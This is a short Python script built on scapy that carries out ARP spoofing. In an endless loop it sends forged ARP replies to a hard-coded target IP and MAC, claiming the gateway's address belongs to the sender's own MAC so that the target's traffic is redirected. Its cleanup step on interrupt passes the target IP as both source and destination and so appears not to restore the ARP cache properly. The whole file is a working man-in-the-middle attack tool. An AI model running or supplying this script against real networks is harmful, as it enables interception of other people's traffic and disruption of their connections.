from scapy.all import *
import time
import uuid 

def get_mac_address():
	import uuid
	# after each 2 digits, join elements of getnode().
	print ("The formatted MAC address is : ", end="")
	print (':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
	for elements in range(0,2*6,2)][::-1]))

	return ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
	for elements in range(0,2*6,2)][::-1])

def sendPackets(gateway_ip, target_ip, this_mac_address, target_mac_address):
	arp = ARP()
	arp.psrc = gateway_ip
	arp.hwsrc = this_mac_address

	arp = arp
	arp.pdst = target_ip # (say IP address of target machine)
	arp.hwdst = target_mac_address # target mac

	ether = Ether()
	ether.src = this_mac_address
	ether.dst = target_mac_address

	arp.op = 2

	def broadcast():
		packet = ether / arp
		sendp(x=packet, verbose=True)

	broadcast()

try:
	while True:
		sendPackets("1.1.1.1", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
except KeyboardInterrupt:
	rearp = 0
	while rearp != 10:
		sendPackets("10.1.9.135", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
		time.sleep(0.1)
		rearp += 1
